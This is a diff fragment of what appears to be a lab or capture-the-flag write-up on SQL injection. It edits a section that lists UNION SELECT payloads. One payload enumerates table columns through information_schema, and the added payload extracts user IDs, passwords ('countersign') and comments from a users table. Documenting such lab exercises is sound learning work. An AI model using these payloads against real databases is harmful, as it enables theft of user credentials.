@@ -12,9 +12,9 @@ List all table columns and related table names:
 1 union select column_name, table_name from information_schema.columns
 ```
 
-List all users with encrypted passwords:
+List id, countersign and comment from users table:
 ```
-1 union select id, comment from Member_images.list_images
+1 union select 1, concat(user_id, char(124), countersign, char(124), Commentaire) from Member_Sql_Injection.users
 ```
 
 ## References
